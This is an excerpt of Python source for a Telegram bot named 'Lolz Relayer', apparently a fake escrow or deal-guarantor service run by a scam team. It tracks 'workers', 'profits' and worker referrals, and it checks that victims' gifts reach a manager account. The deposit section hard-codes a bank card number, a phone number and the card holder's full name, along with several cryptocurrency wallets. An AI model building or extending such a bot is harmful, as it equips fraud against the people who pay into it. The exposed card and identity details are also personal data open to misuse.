...
# По умолчанию telebot в threaded-режиме молча глотает необработанные
# исключения из хендлеров (message/callback_query) — ни в консоль, ни в лог,
# ни в файл. Это делает часть багов невидимой. Ставим свой exception_handler,
# чтобы ЛЮБАЯ необработанная ошибка внутри хендлера гарантированно попадала в лог.
import traceback as _traceback

class _LoggingExceptionHandler(telebot.ExceptionHandler):
    def handle(self, exception):
        print(f"💥 Необработанное исключение в хендлере: {exception}")
        print(_traceback.format_exc())
        return True  # True = считать обработанным, не ронять воркер-поток

# Создаём экземпляр бота с токеном из .env (defaults: threaded=True)
bot = telebot.TeleBot(TOKEN, exception_handler=_LoggingExceptionHandler())
...
DATA_FILE = os.path.join(BASE_DIR, 'lolz_data.pkl')
PHOTO_PATH = os.path.join(BASE_DIR, 'photo.jpg')
VIDEO_PATH = os.path.join(BASE_DIR, 'video1.mp4')   # профиты
PHOTO_PATH = PHOTO_PATH  # используем то же фото что и для остальных экранов
...
# ====================================================================
# ЕДИНЫЙ ФОРУМ ЛОГОВ — одна группа для всего
# chat_id: -1004373662178
# ====================================================================

# Все три переменные указывают на одну и ту же группу
ADMIN_FORUM_ID   = int(os.getenv("LOGS_FORUM_ID") or -1004373662178)
LOGS_FORUM_ID    = ADMIN_FORUM_ID   # backward-compat alias
TEAM_FORUM_ID    = ADMIN_FORUM_ID   # backward-compat alias
PUBLIC_LOGS_FORUM_ID = ADMIN_FORUM_ID  # backward-compat alias
PUBLIC_LOGS_TOPIC = None

# ── Топики форума ────────────────────────────────────────────────────
# 📋 Общие логи
TOPIC_GENERAL_LOGS       = 7
# ✅ Завершённые сделки
TOPIC_DEALS_DONE         = 18
# ❌ Отменённые сделки
TOPIC_DEALS_CANCELLED    = 17
# 🧾 Чеки
TOPIC_RECEIPTS           = 9
# 💰 Пополнения
TOPIC_DEPOSITS           = 10
# 📤 Выводы
TOPIC_WITHDRAWALS        = 11
# 👤 Регистрации — TODO: номер топика не присылали, временно = общие логи
TOPIC_REGISTRATIONS      = TOPIC_GENERAL_LOGS
# 🔗 Рефералы
TOPIC_REFERRALS          = 12
# 🛡 Верификации
TOPIC_VERIFICATIONS      = 13
# 📦 Передача товаров
TOPIC_ITEM_TRANSFERS     = 14
# 👷 Воркеры
TOPIC_WORKERS            = 15
# ⚙️ Аудит
TOPIC_AUDIT              = 16
...
# ── Backward-compat алиасы для старого кода ─────────────────────────
LOGS_FORUM_PROFITS        = TOPIC_DEALS_DONE
LOGS_FORUM_NEW_USERS      = TOPIC_REGISTRATIONS
LOGS_FORUM_WORKER_ADDED   = TOPIC_WORKERS
LOGS_FORUM_TEXT_MESSAGES  = TOPIC_GENERAL_LOGS
LOGS_FORUM_NEW_DEALS      = TOPIC_GENERAL_LOGS
LOGS_FORUM_DEPOSITS       = TOPIC_DEPOSITS
LOGS_FORUM_REQUISITES     = TOPIC_GENERAL_LOGS

TEAM_FORUM_PROFITS        = TOPIC_DEALS_DONE
TEAM_FORUM_PAYOUTS        = TOPIC_WITHDRAWALS
TEAM_FORUM_LOGS           = TOPIC_GENERAL_LOGS
TEAM_FORUM_DEALS          = TOPIC_GENERAL_LOGS

# Алиасы для нового admin_forum_send() в коде
ADMIN_TOPIC_DEALS_EVENTS   = TOPIC_GENERAL_LOGS
ADMIN_TOPIC_DEALS_DISPUTES = TOPIC_DEALS_CANCELLED
ADMIN_TOPIC_PROFIT_PENDING = TOPIC_DEALS_DONE
ADMIN_TOPIC_PROFIT_DONE    = TOPIC_DEALS_DONE
ADMIN_TOPIC_PAYOUT_REQ     = TOPIC_WITHDRAWALS
ADMIN_TOPIC_PAYOUT_HISTORY = TOPIC_WITHDRAWALS
ADMIN_TOPIC_USER_EVENTS    = TOPIC_REGISTRATIONS
ADMIN_TOPIC_ERROR_ALERTS   = TOPIC_ERRORS
ADMIN_TOPIC_AUDIT_ADMINS   = TOPIC_AUDIT
ADMIN_TOPIC_INFO           = TOPIC_GENERAL_LOGS
ADMIN_TOPIC_DIGESTS        = TOPIC_DIGESTS
...
# LOGS_FORUM_REQUISITES определён выше как алиас TOPIC_GENERAL_LOGS
...
DEPOSIT_REQUISITES_DATA = {
    'card_ru': {
        ...
        'icon': '💳',
        'bank': 'ЮMoney',
        'card': '5599002133967051',
        'phone': '+79061298293',
        'owner': 'Брусникин Александр Михайлович'
    },
    'card_ua': {
        'name': 'Карта UA',
        'type': 'card',
    ...
    'crypto_usdt': {
        ...
        'type': 'crypto',
        'icon': '💎',
        'wallet': 'TLFaUQVnrk3yP1XQRGpNyyQemAEZxEjjDr',
        'network': 'TRC20 (Tron)'
    },
    'crypto_ton': {
        'name': 'TON',
        'type': 'crypto',
        'icon': '⚡',
        'wallet': 'UQDG-jrEo0ibiNUBI2gK7MIlSiRmN0QYjUV3o_MX7FPkkxmn',
        'network': 'TON'
    },
    'crypto_btc': {
        'name': 'Bitcoin (BTC)',
        'type': 'crypto',
        'icon': '₿',
        'wallet': 'bc1qklryqg6d2t2jm8ys29n459jjeq2a3y3xw2s2wu',
        'network': 'Bitcoin'
    },
    'crypto_eth': {
        'name': 'Ethereum (ETH)',
        'type': 'crypto',
        'icon': 'Ξ',
        'wallet': '0x15057396bB4149eD85Ac5aB4126885cDbeAAC6D3',
    ...
    'crypto_bnb': {
        ...
        'type': 'crypto',
        'icon': '🔷',
        'wallet': '0x3f195b8f54a46A3DECFe15dF358767598Ae005a6',
    ...
    'crypto_sol': {
        ...
        'type': 'crypto',
        'icon': '🌞',
        'wallet': 'GT11wLFsQf8LSdxcdSYkoDNV6Nzg412YKXiSGsQ8X199',
        'network': 'Solana'
    },
    'stars': {
        'name': 'Telegram Stars',
        'type': 'stars',
        'icon': '⭐',
        'info': 'Stars пополняются напрямую через Telegram.\nДля пополнения обратитесь к поддержке {MANAGER_USERNAME}'
    }
}

def build_requisites_details(method_key, user_id=None):
    """Генерирует текст реквизитов из структурированных данных (с переводом если передан user_id)"""
    from bot_lang import get_text as _gt
    def _t(k):
        if user_id is not None:
            return _gt(user_id, k, users)
        return {
            ...
            'deposit_support_contact': f'Для получения актуальных реквизитов обратитесь в поддержку {MANAGER_USERNAME}',
    ...
    if req_type == 'card':
        lines = [f"{icon} {_t('deposit_requisites_label').format(name=name)}"]
        if data.get('bank', '-') != '-':
        ...
        if len(lines) == 1:
            lines.append(f"<i>{_t('deposit_support_contact').format(support=MANAGER_USERNAME)}</i>")
        lines.append("")
        lines.append(_t('deposit_instructions'))
        lines.append(_t('deposit_instruction_1'))
        lines.append(_t('deposit_instruction_2'))
        lines.append(_t('deposit_instruction_3'))
        lines.append(_t('deposit_instruction_4'))
        lines.append(_t('deposit_instruction_5'))
        lines.append("")
        lines.append(_t('deposit_important_note'))
        return "\n".join(lines)
        ...
        lines.append("")
        lines.append(_t('deposit_instructions'))
        lines.append(_t('deposit_instruction_1_crypto').format(name=name))
        lines.append(_t('deposit_instruction_2'))
        lines.append(_t('deposit_instruction_3'))
        lines.append(_t('deposit_instruction_4'))
        lines.append(_t('deposit_instruction_5'))
        ...
        lines = [f"{icon} {_t('deposit_requisites_label').format(name='Stars')}"]
...
class DynamicRequisites:
    ...
    def for_user(self, user_id):
        """Вернуть прокси с user_id для локализации."""
        proxy = DynamicRequisites()
        proxy._user_id = user_id
        return proxy
    def __getitem__(self, key):
        ...
        return {
            ...
            'details': build_requisites_details(key, self._user_id)
        }
...
VIDEO_AVAILABLE = False   # video1.mp4 — для профитов
PHOTO_AVAILABLE = False  # photo.jpg — для главного меню
...
BOT_NAME = os.getenv("BOT_NAME", "Lolz")



def get_payment_requisites(currency: str) -> str:
    """Возвращает реквизиты для оплаты в зависимости от выбранной валюты."""
    currency_key_map = {
        'TON':   'ton',
        'USDT':  'usdt',
        'RUB':   'rub',
    ...
    currency_label_map = {
        ...
        'RUB':   '🇷🇺 Реквизиты для RUB',
        'USD':   '🇺🇸 Реквизиты для USD',
        'KZT':   '🇰🇿 Реквизиты для KZT',
        'UAH':   '🇺🇦 Реквизиты для UAH',
        'BYN':   '🇧🇾 Реквизиты для BYN',
        'STARS': '⭐ Username для Stars',
    }
    key = currency_key_map.get(currency.upper())
    label = currency_label_map.get(currency.upper(), currency)
    if not key:
        return f"<b>Реквизиты для {currency}:</b>\nУточните у поддержки."
    data = DEPOSIT_REQUISITES_DATA.get(key, {})
    value = (data.get('address') or data.get('value') or
             data.get('number') or data.get('username') or 'Не настроено')
    return f"<b>{label}:</b>\n<code>{value}</code>"
...
def save_data():
    ...
    # Уникальное имя tmp-файла на каждый вызов (pid+thread+monotonic) —
    # иначе конкурентные save_data() из разных потоков делят один и тот же
    # 'lolz_data.pkl.tmp' и второй вызов ловит FileNotFoundError на os.replace,
    # потому что первый уже успел его переименовать.
    try:
        tmp_path = f"{DATA_FILE}.{os.getpid()}.{threading.get_ident()}.{int(time.time()*1000)}.tmp"
...
class TelegramOwnerErrorHandler(logging.Handler):
    ...
    def emit(self, record: logging.LogRecord) -> None:
        ...
        if record.name.startswith('lolz.alerter'):
            return
        try:
...
def _safe_send_to_owner(payload: str) -> None:
    ...
    """
    alerter_log = logging.getLogger('lolz.alerter')
    delivered = False
...
def check_media_files():
    ...
    global PHOTO_AVAILABLE, VIDEO_AVAILABLE, PHOTO_AVAILABLE
    ...
    print(f"🔍 Проверка фото для главного меню: {PHOTO_PATH}")
    if os.path.exists(PHOTO_PATH):
        try:
            with open(PHOTO_PATH, 'rb') as f:
                if f.read(1):
                    PHOTO_AVAILABLE = True
                    print(f"✅ Фото меню найдено: {PHOTO_PATH}")
                else:
                    PHOTO_AVAILABLE = False
                    print(f"❌ Файл фото меню пустой: {PHOTO_PATH}")
        except Exception as e:
            PHOTO_AVAILABLE = False
            print(f"❌ Ошибка чтения видео меню: {e}")
    else:
        PHOTO_AVAILABLE = False
        print(f"❌ Фото меню не найдено: {PHOTO_PATH}")

check_media_files()

def _strip_tg_emoji(text):
    """Убирает <tg-emoji emoji-id='...'>X</tg-emoji>, оставляя только X.
    Fallback на случай, когда Telegram отклоняет сообщение с DOCUMENT_INVALID
    из-за невалидного/недоступного custom emoji ПРЯМО В ТЕКСТЕ подписи."""
    if not text:
        return text
    try:
        return re.sub(r"<tg-emoji emoji-id=['\"][^'\"]+['\"]>(.*?)</tg-emoji>", r"\1", text)
    except Exception as e:
        print(f"⚠️ Не удалось упростить текст (tg-emoji): {e}")
        return text


def _downgrade_markup(reply_markup):
    """Возвращает копию клавиатуры БЕЗ style/icon_custom_emoji_id (обычные InlineKeyboardButton).
    Нужно как fallback, когда Telegram отклоняет сообщение с DOCUMENT_INVALID/PHOTO_INVALID
    из-за невалидного/недоступного icon_custom_emoji_id на одной из кнопок."""
    if reply_markup is None or not hasattr(reply_markup, 'keyboard'):
        return reply_markup
    try:
        plain = telebot.types.InlineKeyboardMarkup(row_width=reply_markup.row_width or 1)
        for row in reply_markup.keyboard:
            ...
            for btn in row:
                ...
                plain_row.append(telebot.types.InlineKeyboardButton(btn.text, **kwargs))
            plain.keyboard.append(plain_row)
        return plain
    except Exception as e:
        print(f"⚠️ Не удалось упростить клавиатуру: {e}")
        return reply_markup
...
def send_media_message(chat_id, message_id, text, reply_markup=None, is_video=False):
    ...
    def _send_new(markup=None, caption=None, _retried_markup=False, _retried_text=False):
        markup = reply_markup if markup is None else markup
        ...
        if PHOTO_AVAILABLE:
            try:
                ...
                err = str(e).lower()
                if any(x in err for x in ['document_invalid', 'photo_invalid']):
                    if not _retried_markup and markup is not None:
                        print(f"⚠️ Ошибка отправки фото из-за клавиатуры, пробуем без стилей кнопок: {e}")
                        return _send_new(markup=_downgrade_markup(markup), caption=caption,
                                          _retried_markup=True, _retried_text=_retried_text)
                    if not _retried_text:
                        print(f"⚠️ Ошибка отправки фото из-за текста, пробуем без tg-emoji в подписи: {e}")
                        return _send_new(markup=markup, caption=_strip_tg_emoji(caption),
                                          _retried_markup=_retried_markup, _retried_text=True)
        ...
        try:
            ...
            if any(x in err for x in ['document_invalid', 'photo_invalid']):
                if not _retried_markup and markup is not None:
                    print(f"⚠️ Ошибка отправки текста из-за клавиатуры, пробуем без стилей кнопок: {e}")
                    return _send_new(markup=_downgrade_markup(markup), caption=caption,
                                      _retried_markup=True, _retried_text=_retried_text)
                if not _retried_text:
                    print(f"⚠️ Ошибка отправки текста из-за tg-emoji, пробуем без них: {e}")
                    return _send_new(markup=markup, caption=_strip_tg_emoji(caption),
                                      _retried_markup=_retried_markup, _retried_text=True)
    ...
    # 1. Пробуем edit_message_caption (сообщение с фото/видео)
    def _try_edit_caption(markup, caption):
    ...
    try:
        _try_edit_caption(reply_markup, text)
        return
    except Exception as e:
        err = str(e).lower()
        if 'message is not modified' in err:
            return
        # Логируем настоящую причину провала edit_message_caption всегда,
        # даже если дальше код пойдёт по одному из fallback-путей —
        # иначе реальная ошибка теряется и виден только вторичный сбой.
        print(f"🔎 edit_message_caption failed (chat_id={chat_id}, message_id={message_id}): {e}")

        if any(x in err for x in ['document_invalid', 'photo_invalid']):
            # 1b. Пробуем ту же операцию с упрощённой клавиатурой (без style/icon_custom_emoji_id)
            try:
                _try_edit_caption(_downgrade_markup(reply_markup), text)
                print("✅ Сработало без стилей кнопок — проблема была в icon_custom_emoji_id/style клавиатуры")
                return
            except Exception as e_dg:
                print(f"⚠️ edit_message_caption с упрощённой клавиатурой тоже не сработал: {e_dg}")
            # 1c. Пробуем без <tg-emoji> в самом тексте подписи
            try:
                _try_edit_caption(reply_markup, _strip_tg_emoji(text))
                print("✅ Сработало без tg-emoji в тексте — проблема была в custom emoji подписи")
                return
            except Exception as e_te:
                print(f"⚠️ edit_message_caption без tg-emoji тоже не сработал: {e_te}")

        # 2. Если caption не поддерживается — это текстовое сообщение, редактируем текст
        if any(x in err for x in ['there is no caption', 'message_to_edit_not_found',
                                    'there is no media', 'document_invalid', 'photo_invalid']):
            try:
                ...
                if 'message is not modified' in err2:
                    return
                print(f"⚠️ edit_message_text failed: {e2}")

    # 3. Fallback — удаляем и отправляем новое
    try:
...
def send_photo_message(chat_id, message_id, text, reply_markup=None):
    """Отправляет сообщение (редактирует существующее или создаёт новое)."""
...
def check_gifts_received(deal_id: str) -> tuple[bool, list[str]]:
    ...
    Возвращает (ok, missing). ok=True если у нас на {MANAGER_USERNAME} пришли
        ...
        if user_id in users and users[user_id].get('awaiting_item_withdrawal'):
            try:
                bot.send_message(
                    ...
                    "Пожалуйста, свяжитесь с техподдержкой: {MANAGER_USERNAME}",
                    parse_mode='HTML'
                )
...
def notify_admin_credentials(user_id, credential_type, new_value):
    ...
    if credential_type == 'ton_wallet' or credential_type == 'crypto_wallet':
        icon = "🪙"
        name = "крипто-кошелёк"
    ...
    message = f"""<tg-emoji emoji-id="5445353829304387411">💳</tg-emoji> <b>НОВЫЕ РЕКВИЗИТЫ | Lolz Relayer</b>
...
def init_user(user_id, referrer_id=None):
    ...
    if user_id not in users:
        ...
        _referrer_is_worker = referrer_id and referrer_id in users and (is_team_worker(referrer_id) or is_team_admin(referrer_id))
        ...
        users[user_id] = {
            ...
            'disputes_won': 0,
            'rating': None,
            'balance': {'TON': 0.0, 'RUB': 0.0, 'USDT': 0.0, 'KZT': 0.0, 'UAH': 0.0, 'BYN': 0.0, 'USD': 0.0, 'STARS': 0, 'UZS': 0.0},
...
TEXTS_RU_WELCOME = """<b><tg-emoji emoji-id="5893255507380014983">💼</tg-emoji> Добро пожаловать в Lolz Relayer 🤝</b>
